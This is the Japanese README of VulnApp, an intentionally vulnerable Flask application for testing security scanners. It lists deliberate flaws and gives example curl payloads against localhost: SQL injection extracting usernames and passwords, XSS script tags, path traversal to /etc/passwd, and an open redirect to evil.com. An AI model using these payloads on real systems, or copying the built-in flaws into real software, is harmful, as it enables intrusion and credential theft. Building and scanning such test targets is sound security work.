# VulnApp

意図的に脆弱性を含むFlask製Webアプリケーション（教育・検証用）

## ⚠️ 警告

このアプリケーションは**意図的に脆弱性を含んでいます**。

- **本番環境では絶対に使用しないでください**
- セキュリティスキャナー（Tenable WAS、OWASP ZAP等）の評価・検証専用
- ローカル環境または隔離されたテスト環境でのみ使用してください

---

## 📋 実装済み脆弱性

### コア脆弱性（5種類）

| # | 脆弱性 | エンドポイント | 説明 |
|---|--------|---------------|------|
| 1 | **SQL Injection** | `/product/search?id=` | パラメータ化されていないクエリによるSQLi |
| 2 | **Reflected XSS** | `/products?search=` | 検索結果へのスクリプト反映（safeフィルタ使用） |
| 3 | **Stored XSS** | `/product/<id>/review` (POST) | レビューコメントへのスクリプト保存 |
| 4 | **Path Traversal** | `/files?file=` | 絶対・相対パスでのファイルアクセス |
| 5 | **Missing Security Headers** | 全エンドポイント | X-Frame-Options、CSP等のヘッダー未設定 |

### 追加脆弱性

| # | 脆弱性 | エンドポイント | 説明 |
|---|--------|---------------|------|
| 6 | **Open Redirect** | `/redirect?url=` | 任意URLへの無検証リダイレクト |
| 7 | **Directory Listing** | `/uploads/`, `/static/downloads/` | ディレクトリ内容の一覧表示 |
| 8 | **Information Disclosure** | `/api/info` | システム情報の露出 |
| 9 | **Clickjacking** | `/clickjacking-demo` | X-Frame-Options未設定によるiframe埋め込み |
| 10 | **Command Injection（潜在）** | `/tools/ping`, `/tools/nslookup` | OSコマンド実行の可能性 |
| 11 | **Admin Exposure** | `/admin/clear-reviews` | 管理機能の露出 |

---

## 🚀 セットアップ

### 必要要件

- Python 3.8以上
- pip
- (本番相当の検証時) sudo権限（ポート80使用時）

### インストール手順

#### 1. リポジトリをクローン

```bash
git clone https://github.com/mizuna-honeypot/VulnApp.git
cd VulnApp
```

#### 2. 仮想環境を作成

```bash
python3 -m venv venv
source venv/bin/activate  # Windowsの場合: venv\Scripts\activate
```

#### 3. 依存パッケージをインストール

```bash
pip install -r requirements.txt
```

#### 4. データベースとサンプルファイルを初期化

```bash
python3 init_db.py
```

このスクリプトは以下を実行します：
- SQLiteデータベース（`vulnapp.db`）の作成
- サンプル商品データの投入
- `uploads/`ディレクトリとサンプルファイルの作成

#### 5. アプリケーションを起動

**開発環境（ポート5000）:**

```bash
python3 app.py
```

**本番相当の検証（ポート80、sudo必須）:**

```bash
sudo venv/bin/python3 app.py
```

アプリケーションは以下のURLでアクセス可能：
- 開発環境: http://localhost:5000
- 本番相当: http://localhost

---

## 🧪 脆弱性テスト例

### 1. SQL Injection

**Union-based SQLi:**
```bash
curl "http://localhost/product/search?id=1+OR+1=1--"
curl "http://localhost/product/search?id=1+UNION+SELECT+NULL,username,password,NULL+FROM+users--"
```

### 2. Reflected XSS

```bash
curl "http://localhost/products?search=<script>alert('XSS')</script>"
```

### 3. Stored XSS

```bash
curl -X POST \
  -d "name=Hacker&review=<script>alert('Stored XSS')</script>" \
  http://localhost/product/1/review
```

### 4. Path Traversal

```bash
# 相対パス
curl "http://localhost/files?file=../../app.py"

# 絶対パス
curl "http://localhost/files?file=/etc/passwd"
```

### 5. Open Redirect

```bash
curl -I "http://localhost/redirect?url=https://evil.com"
```

### 6. Directory Listing

```bash
curl http://localhost/uploads/
curl http://localhost/static/downloads/
```

### 7. Clickjacking

ブラウザで以下にアクセス：
- デモページ: http://localhost/clickjacking-demo
- 攻撃例: http://localhost/clickjacking-attack-demo

---

## 📁 プロジェクト構造

```
VulnApp/
├── app.py                      # メインアプリケーション
├── init_db.py                  # データベース初期化スクリプト
├── requirements.txt            # Python依存パッケージ
├── vulnapp.db                  # SQLiteデータベース（自動生成）
├── flask.log                   # アプリケーションログ
├── .gitignore                  # Git除外設定
│
├── templates/                  # Jinjaテンプレート
│   ├── base.html              # ベーステンプレート
│   ├── index.html             # トップページ
│   ├── products.html          # 商品一覧（XSS脆弱）
│   ├── product_detail.html    # 商品詳細（Stored XSS脆弱）
│   ├── sqli_search.html       # SQLi検索ページ
│   ├── file_view.html         # ファイルビューア（Path Traversal脆弱）
│   ├── open_redirect_demo.html # オープンリダイレクトデモ
│   ├── clickjacking_demo.html  # クリックジャッキングデモ
│   ├── tools.html             # ツールページ
│   └── account_settings.html  # アカウント設定
│
├── static/                     # 静的ファイル
│   ├── files/
│   │   ├── public.txt         # 公開ファイル
│   │   └── secret.txt         # 機密ファイル（Path Traversal対象）
│   └── downloads/             # Directory Listing用
│
├── uploads/                    # アップロードディレクトリ（Directory Listing脆弱）
│   ├── .gitkeep
│   ├── sample1.txt
│   ├── sample2.txt
│   └── confidential.txt
│
└── venv/                       # Python仮想環境（Gitで無視）
```

---

## 🔍 スキャナー検証

このアプリケーションは以下のスキャナーで検証できます：

- **Tenable WAS** (Web Application Scanning)
- **OWASP ZAP** (Zed Attack Proxy)
- **Burp Suite**
- **Nikto**
- **Acunetix**

### 推奨スキャン設定

| 項目 | 設定値 |
|------|--------|
| スキャン対象URL | `http://your-ip/` または `http://your-ip:5000/` |
| クロール深度 | Medium以上 |
| 認証 | なし（匿名アクセス可能） |
| スキャンプロファイル | Full Scan |

---

## 🛠️ トラブルシューティング

### ポート80で起動できない

```bash
# ポート使用状況を確認
sudo lsof -i :80

# 既存プロセスを停止
sudo fuser -k 80/tcp

# 再起動
sudo venv/bin/python3 app.py
```

### データベースロックエラー

```bash
# ロックファイルを削除
rm -f vulnapp.db-journal vulnapp.db-wal vulnapp.db-shm

# データベースを再初期化
python3 init_db.py
```

### プロセスが残っている

```bash
# すべてのFlaskプロセスを停止
pkill -9 -f "python3 app.py"

# 確認
ps aux | grep "python3 app.py"
```

---

## 📝 ライセンス

MIT License - 教育・検証目的でのみ使用してください。

---

## 🤝 貢献

Pull Requestを歓迎します！新しい脆弱性パターンの追加や改善提案をお待ちしています。

### 貢献ガイドライン

1. このリポジトリをフォーク
2. 新しいブランチを作成 (`git checkout -b feature/new-vulnerability`)
3. 変更をコミット (`git commit -am 'Add new vulnerability: XXX'`)
4. ブランチにプッシュ (`git push origin feature/new-vulnerability`)
5. Pull Requestを作成

---

## 📚 参考資料

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [CWE - Common Weakness Enumeration](https://cwe.mitre.org/)

---

**作成者**: [mizuna-honeypot](https://github.com/mizuna-honeypot)  
**リポジトリ**: https://github.com/mizuna-honeypot/VulnApp
